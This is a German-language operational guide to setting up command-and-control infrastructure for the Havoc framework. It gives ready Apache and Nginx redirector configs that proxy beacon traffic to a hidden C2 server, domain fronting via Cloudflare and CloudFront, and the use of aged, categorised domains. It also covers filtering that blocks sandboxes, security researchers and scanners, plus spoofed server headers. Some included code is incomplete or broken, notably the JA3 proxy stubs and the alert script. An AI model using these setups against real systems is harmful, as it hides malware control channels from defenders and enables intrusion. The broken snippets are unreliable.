# C2 Infrastruktur-Setup: Redirectors & Domain Fronting

> **Ziel:** Verschleierung der echten C2-Server-IP durch Redirectors und Domain Fronting für maximale OPSEC.

---

## 📋 Inhaltsverzeichnis

1. [Architektur-Übersicht](#architektur-übersicht)
2. [Redirector Setup (Apache/Nginx)](#redirector-setup)
3. [Domain Fronting mit CDN](#domain-fronting-mit-cdn)
4. [Traffic-Filterung & Validierung](#traffic-filterung--validierung)
5. [Monitoring & Logging](#monitoring--logging)

---

## Architektur-Übersicht

### Warum Redirectors?

**Vorteile:**
- ✅ Schützt die echte C2-Server-IP
- ✅ Ermöglicht schnellen Infrastruktur-Wechsel
- ✅ Filtert unerwünschten Traffic (Sandboxen, Analysten)
- ✅ Kann mehrere C2-Server verwalten
- ✅ Täuschung durch legitime Webserver-Headers

### Infrastruktur-Komponenten

```
┌─────────────┐      ┌─────────────┐      ┌─────────────┐      ┌─────────────┐
│   Target    │─────▶│  Redirector │─────▶│  C2 Server  │◀─────│  Operator   │
│   System    │      │   (Public)  │      │  (Hidden)   │      │ Workstation │
└─────────────┘      └─────────────┘      └─────────────┘      └─────────────┘
                            │                                           
                            │ Blockt:                                   
                            ├─ Sandboxen                               
                            ├─ Security Researchers                    
                            └─ Unbekannte IPs                         
```

**Empfohlene Anzahl:**
- **Minimum:** 1 Redirector + 1 C2 Server
- **Empfohlen:** 2-3 Redirectors + 1 C2 Server
- **Enterprise:** 5+ Redirectors + 2+ C2 Server (Load Balancing)

---

## Redirector Setup

### Option 1: Apache mod_rewrite

#### Schritt 1: VPS für Redirector mieten

**Empfohlene Provider für Redirectors:**
- **Vultr:** $2.50-5/Monat (viele Standorte)
- **DigitalOcean:** $4-6/Monat (einfach)
- **OVH:** €3.50/Monat (Europa)
- **Linode:** $5/Monat (stabil)

**Anforderungen:**
- 1 CPU Core
- 512 MB - 1 GB RAM
- 10 GB Storage
- Dedizierte IP
- Ubuntu 20.04/22.04

#### Schritt 2: Apache installieren

```bash
# System aktualisieren
sudo apt update && sudo apt upgrade -y

# Apache installieren
sudo apt install apache2 -y

# Module aktivieren
sudo a2enmod rewrite proxy proxy_http ssl headers

# Apache neustarten
sudo systemctl restart apache2
```

#### Schritt 3: Redirector-Profil konfigurieren

Erstellen Sie eine neue VHost-Konfiguration:

```bash
sudo nano /etc/apache2/sites-available/redirector.conf
```

**Basis-Konfiguration (HTTP → C2):**

```apache
<VirtualHost *:80>
    ServerName ihre-domain.com
    ServerAdmin admin@ihre-domain.com

    # Logging (für Analyse)
    ErrorLog ${APACHE_LOG_DIR}/redirector_error.log
    CustomLog ${APACHE_LOG_DIR}/redirector_access.log combined

    # Traffic-Filterung aktivieren
    RewriteEngine On

    # 1. Blockiere bekannte Sandboxen/Scanner IPs
    RewriteCond %{REMOTE_ADDR} ^192\.0\.2\. [OR]
    RewriteCond %{REMOTE_ADDR} ^198\.18\. [OR]
    RewriteCond %{REMOTE_ADDR} ^203\.0\.113\.
    RewriteRule ^.*$ - [F,L]

    # 2. Blockiere verdächtige User-Agents
    RewriteCond %{HTTP_USER_AGENT} ^.*(bot|spider|crawler|scanner|curl|wget|python).*$ [NC]
    RewriteRule ^.*$ - [F,L]

    # 3. Nur spezifische URIs an C2 weiterleiten
    # Anpassen an Ihre Havoc Listener-Konfiguration!
    RewriteCond %{REQUEST_URI} ^/api/.*$ [OR]
    RewriteCond %{REQUEST_URI} ^/updates/.*$ [OR]
    RewriteCond %{REQUEST_URI} ^/content/.*$
    RewriteRule ^.*$ http://IHRE_C2_SERVER_IP:443%{REQUEST_URI} [P,L]

    # 4. Alle anderen Requests zu "legitimem" Inhalt
    # Täuschung: Zeige normale Webseite
    RewriteRule ^.*$ /var/www/html/index.html [L]

    # Proxy-Einstellungen
    ProxyRequests Off
    ProxyPreserveHost On
    
    <Proxy *>
        Order deny,allow
        Allow from all
    </Proxy>
</VirtualHost>
```

**Erweiterte OPSEC-Konfiguration:**

```apache
<VirtualHost *:443>
    ServerName ihre-domain.com
    
    # SSL-Konfiguration
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/ihre-domain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/ihre-domain.com/privkey.pem
    
    # Moderne SSL-Ciphers
    SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite HIGH:!aNULL:!MD5:!3DES
    SSLHonorCipherOrder on

    # Header-Manipulation (tarnt als normale Webseite)
    Header set Server "Apache/2.4.41 (Ubuntu)"
    Header set X-Powered-By "PHP/7.4.3"
    Header set X-Content-Type-Options "nosniff"
    Header set X-Frame-Options "SAMEORIGIN"
    
    # Logging
    ErrorLog ${APACHE_LOG_DIR}/redirector_ssl_error.log
    CustomLog ${APACHE_LOG_DIR}/redirector_ssl_access.log combined

    RewriteEngine On

    # === WHITELISTING (Empfohlen für echte Engagements) ===
    # Nur bekannte Beacon/Agent JA3 Fingerprints durchlassen
    # Beispiel: Nur Traffic mit spezifischem Cookie
    RewriteCond %{HTTP_COOKIE} !session=[a-f0-9]{32}
    RewriteRule ^.*$ - [F,L]

    # === GEO-FILTERING ===
    # Beispiel: Nur Traffic aus bestimmten Ländern (benötigt mod_geoip)
    # RewriteCond %{ENV:GEOIP_COUNTRY_CODE} !^(DE|AT|CH)$
    # RewriteRule ^.*$ - [F,L]

    # === TIME-BASED FILTERING ===
    # Nur während Geschäftszeiten (Montag-Freitag, 08:00-18:00)
    RewriteCond %{TIME_WDAY} ^(0|6)$ [OR]
    RewriteCond %{TIME_HOUR} ^(0[0-7]|1[8-9]|2[0-3])$
    RewriteRule ^/api/.*$ - [F,L]

    # === URI VALIDATION ===
    # Nur erlaubte URIs zu C2 weiterleiten
    RewriteCond %{REQUEST_URI} ^/api/v2/check$ [OR]
    RewriteCond %{REQUEST_URI} ^/api/v2/submit$ [OR]
    RewriteCond %{REQUEST_URI} ^/updates/pkg/[a-z0-9]+$
    RewriteRule ^.*$ https://IHRE_C2_SERVER_IP:443%{REQUEST_URI} [P,L]

    # === FALLBACK ===
    # Zeige echte Webseite für alle anderen
    DocumentRoot /var/www/html
    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # Proxy-Konfiguration
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    ProxyRequests Off
    ProxyPreserveHost On
    ProxyTimeout 300
</VirtualHost>
```

#### Schritt 4: Site aktivieren und Apache neu laden

```bash
# Standard-Site deaktivieren
sudo a2dissite 000-default.conf

# Redirector aktivieren
sudo a2ensite redirector.conf

# Konfiguration testen
sudo apache2ctl configtest

# Apache neu laden
sudo systemctl reload apache2
```

---

### Option 2: Nginx Redirector

```bash
# Nginx installieren
sudo apt install nginx -y
```

**Konfiguration:**

```bash
sudo nano /etc/nginx/sites-available/redirector
```

```nginx
upstream c2_backend {
    server IHRE_C2_SERVER_IP:443;
}

# HTTP → HTTPS Redirect
server {
    listen 80;
    server_name ihre-domain.com;
    return 301 https://$server_name$request_uri;
}

# HTTPS Redirector
server {
    listen 443 ssl http2;
    server_name ihre-domain.com;

    # SSL-Konfiguration
    ssl_certificate /etc/letsencrypt/live/ihre-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ihre-domain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Header-Manipulation
    add_header Server "nginx/1.18.0 (Ubuntu)" always;
    add_header X-Content-Type-Options "nosniff" always;
    
    # Logging
    access_log /var/log/nginx/redirector_access.log;
    error_log /var/log/nginx/redirector_error.log;

    # === TRAFFIC FILTERING ===
    
    # Blockiere Scanner
    if ($http_user_agent ~* (bot|spider|crawler|scanner|curl|wget|python)) {
        return 403;
    }

    # === C2 PROXY RULES ===
    
    location ~ ^/api/(check|submit) {
        # Validierung: Nur mit korrektem Cookie
        if ($http_cookie !~ "session=[a-f0-9]{32}") {
            return 404;
        }
        
        proxy_pass https://c2_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
        proxy_redirect off;
        proxy_buffering off;
        
        # WebSocket Support (falls benötigt)
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }

    # === FALLBACK: Normale Webseite ===
    
    location / {
        root /var/www/html;
        index index.html;
        try_files $uri $uri/ =404;
    }
}
```

**Aktivieren:**

```bash
sudo ln -s /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

---

## Domain Fronting mit CDN

### Was ist Domain Fronting?

Domain Fronting nutzt CDN-Dienste (Cloudflare, AWS CloudFront, Azure CDN), um die echte Ziel-Domain zu verschleiern.

**Funktionsweise:**
```
Agent sendet Request zu: www.google.com (SNI)
Aber Host-Header zeigt auf: ihre-c2-domain.com
CDN routet zum echten C2 basierend auf Host-Header
```

**⚠️ Hinweis:** Viele CDN-Provider haben Domain Fronting blockiert. Alternativen existieren.

### Option 1: Cloudflare (Einfach, aber limitiert)

#### Schritt 1: Domain zu Cloudflare hinzufügen

1. Registrieren Sie sich bei Cloudflare (kostenlos)
2. Fügen Sie Ihre Domain hinzu
3. Ändern Sie Nameserver bei Ihrem Domain-Registrar

#### Schritt 2: DNS-Einträge konfigurieren

```
Type: A
Name: c2
Content: REDIRECTOR_IP
Proxy Status: Proxied (Orange Cloud ☁️)
```

#### Schritt 3: Cloudflare SSL/TLS-Einstellungen

- **SSL/TLS Encryption Mode:** Full (strict)
- **Always Use HTTPS:** On
- **Minimum TLS Version:** TLS 1.2
- **TLS 1.3:** On

#### Schritt 4: Havoc Listener anpassen

In Ihrer `havoc.yaotl`:

```yaml
Listeners:
  - Name: "Cloudflare HTTPS"
    Protocol: https
    Hosts:
      - "c2.ihre-domain.com"  # Ihre Cloudflare-Domain
    Port: 443
    HostBind: 0.0.0.0
    PortBind: 443
    Secure: true
```

**Vorteile:**
- ✅ Kostenlos
- ✅ DDoS-Schutz
- ✅ Verschleiert C2-IP
- ✅ Legitime CDN-IPs

**Nachteile:**
- ❌ Cloudflare kann Traffic analysieren
- ❌ Echtes Domain Fronting nicht möglich
- ❌ Kann blockiert werden

---

### Option 2: AWS CloudFront (Fortgeschritten)

#### Schritt 1: S3 Bucket erstellen

```bash
aws s3 mb s3://legitimate-website-backup-2026
aws s3 website s3://legitimate-website-backup-2026 --index-document index.html
```

#### Schritt 2: CloudFront Distribution erstellen

```bash
aws cloudfront create-distribution \
  --origin-domain-name legitimate-website-backup-2026.s3.amazonaws.com \
  --default-root-object index.html
```

**Custom Origin (zu Ihrem C2):**

```json
{
  "Origins": {
    "Items": [
      {
        "Id": "C2-Origin",
        "DomainName": "ihre-redirector-domain.com",
        "CustomOriginConfig": {
          "HTTPPort": 80,
          "HTTPSPort": 443,
          "OriginProtocolPolicy": "https-only",
          "OriginSslProtocols": {
            "Items": ["TLSv1.2"],
            "Quantity": 1
          }
        }
      }
    ]
  }
}
```

#### Schritt 3: Beacon-Konfiguration

Nutzen Sie einen bekannten Domain für SNI:

```
Host Header: ihre-c2-domain.cloudfront.net
SNI: www.amazon.com (oder andere AWS-Domain)
```

**⚠️ Warnung:** AWS blockiert aktiv Domain Fronting. Dies funktioniert möglicherweise nicht mehr.

---

### Option 3: Kategorisierte Domains (Alternative)

Anstelle von Domain Fronting: Nutzen Sie bereits kategorisierte Domains.

**Strategie:**

1. **Kaufen Sie eine alte Domain** mit guter Historie:
   - ExpiredDomains.net
   - Alter: 5+ Jahre
   - Backlinks vorhanden
   - Kategorisiert als "Business", "Technology", etc.

2. **Überprüfen Sie die Kategorisierung:**
   ```bash
   # Bluecoat/Symantec
   https://sitereview.bluecoat.com/
   
   # Fortiguard
   https://www.fortiguard.com/webfilter
   
   # Palo Alto
   https://urlfiltering.paloaltonetworks.com/
   ```

3. **Hosten Sie legitimen Content:**
   - WordPress-Blog mit echten Artikeln
   - Business-Webseite
   - Portfolio-Seite

4. **Verstecken Sie C2-Endpoints:**
   ```
   https://ihre-domain.com/              → Normale Webseite
   https://ihre-domain.com/blog/         → WordPress
   https://ihre-domain.com/api/v2/check  → C2 Beacon Endpoint
   ```

---

## Traffic-Filterung & Validierung

### IP-Blacklisting

**Bekannte Scanner-IPs blockieren:**

```bash
# VirusTotal Scanner IPs
sudo iptables -A INPUT -s 77.240.32.0/20 -j DROP

# Shodan Scanner
sudo iptables -A INPUT -s 104.131.0.0/16 -j DROP
sudo iptables -A INPUT -s 162.159.246.0/24 -j DROP

# Censys Scanner
sudo iptables -A INPUT -s 192.35.168.0/24 -j DROP

# Änderungen speichern
sudo netfilter-persistent save
```

**Automatische Blacklist-Updates:**

Erstellen Sie Script `/opt/update-blacklist.sh`:

```bash
#!/bin/bash

# Lade bekannte Scanner-IPs
curl -s https://raw.githubusercontent.com/stamparm/ipsum/master/ipsum.txt | \
  grep -v '^#' | while read IP; do
    sudo iptables -A INPUT -s "$IP" -j DROP
done

# Speichern
sudo netfilter-persistent save
```

Cronjob hinzufügen:

```bash
sudo crontab -e
```

```
0 2 * * * /opt/update-blacklist.sh
```

---

### JA3 Fingerprinting (Fortgeschritten)

JA3 identifiziert TLS-Clients basierend auf ihren SSL/TLS-Parametern.

**Installation:**

```bash
sudo apt install python3-pip -y
sudo pip3 install ja3
```

**Apache mod_ssl mit JA3:**

Leider keine native Unterstützung. Alternative: Nutzen Sie einen vorgeschalteten Proxy.

**Python-Proxy mit JA3-Validierung:**

```python
#!/usr/bin/env python3
import ssl
from http.server import HTTPServer, BaseHTTPRequestHandler
import hashlib

ALLOWED_JA3_HASHES = [
    "e7d705a3286e19ea42f587b344ee6865",  # Ihr Havoc Agent JA3
    "ac1c84371c1e0e72dc69c10b1b8b4b4e",  # Alternativer Agent
]

class JA3FilterHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # JA3 Hash berechnen (vereinfacht)
        # In Produktion: Nutzen Sie eine richtige JA3-Library
        client_ja3 = self.calculate_ja3()
        
        if client_ja3 in ALLOWED_JA3_HASHES:
            # Weiterleiten zu C2
            self.proxy_to_c2()
        else:
            # Blockieren
            self.send_response(404)
            self.end_headers()
    
    def calculate_ja3(self):
        # Implementierung hier
        pass
    
    def proxy_to_c2(self):
        # Proxy-Logik
        pass

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8443), JA3FilterHandler)
    server.socket = ssl.wrap_socket(server.socket, certfile='/etc/ssl/cert.pem', server_side=True)
    server.serve_forever()
```

---

## Monitoring & Logging

### Log-Analyse

**Interessante Logs:**

```bash
# Apache Access Logs
sudo tail -f /var/log/apache2/redirector_access.log

# Geblockte Requests
sudo grep -E "(403|blocked)" /var/log/apache2/redirector_access.log

# Verdächtige User-Agents
sudo grep -iE "(bot|spider|scanner)" /var/log/apache2/redirector_access.log

# Erfolgreiche C2-Callbacks
sudo grep "200" /var/log/apache2/redirector_access.log | grep "/api/"
```

**Automatische Alerting:**

```bash
#!/bin/bash
# /opt/monitor-redirector.sh

LOGFILE="/var/log/apache2/redirector_access.log"
ALERT_EMAIL="ihre-email@domain.com"
THRESHOLD=100

# Zähle blockierte Requests in letzter Stunde
BLOCKED=$(sudo grep -c "403" "$LOGFILE" | tail -n 100)

if [ "$BLOCKED" -gt "$THRESHOLD" ]; then
    echo "ALERT: $BLOCKED geblockte Requests in letzter Stunde!" | \
      mail -s "Redirector Alert" "$ALERT_EMAIL"
fi
```

---

## Best Practices

### ✅ DO's

1. **Mehrere Redirectors:** Verteilen Sie Traffic auf 2-3 Redirectors
2. **Kategorisierte Domains:** Nutzen Sie Domains mit guter Reputation
3. **Traffic-Profiling:** Beacon nur zu realistischen Zeiten
4. **SSL/TLS:** Immer gültige Zertifikate verwenden
5. **Logging:** Aber rotieren und anonymisieren Sie Logs
6. **Firewall:** Nur notwendige Ports öffnen
7. **Updates:** Halten Sie Redirector-Software aktuell

### ❌ DON'T's

1. **Nie direkt zu C2:** Immer Redirector dazwischen
2. **Keine free Domains:** .tk, .ml, etc. sind verbrannt
3. **Kein Self-Signed SSL:** Nutzen Sie Let's Encrypt
4. **Keine offensichtlichen Namen:** "c2.domain.com" ist schlecht
5. **Nicht auf bekannten C2-Ports:** 50050, etc. vermeiden
6. **Keine Logs öffentlich:** Sensitive Logs schützen
7. **Kein statischer Traffic:** Variieren Sie Beacon-Intervalle

---

## Checkliste: Deployment

Vor dem Go-Live:

- [ ] Redirector-VPS ist gehärtet (SSH-Keys, Firewall, Updates)
- [ ] Apache/Nginx korrekt konfiguriert
- [ ] SSL-Zertifikat gültig und automatisch verlängert
- [ ] Traffic-Filterung getestet (blockiert Scanner)
- [ ] C2-Endpoints nur über erlaubte URIs erreichbar
- [ ] Fallback-Webseite sieht legitim aus
- [ ] Logs werden geschrieben und rotiert
- [ ] Monitoring/Alerting funktioniert
- [ ] Beacon-Test von externer IP erfolgreich
- [ ] Backup der Konfiguration erstellt

---

## Weitere Ressourcen

- **Apache mod_rewrite Guide:** https://httpd.apache.org/docs/current/mod/mod_rewrite.html
- **Nginx Proxy Guide:** https://nginx.org/en/docs/http/ngx_http_proxy_module.html
- **Red Team Infrastructure:** https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
- **Cobalt Strike Redirectors:** https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/

---

**Erstellt:** 2026-02-05
**Version:** 1.0
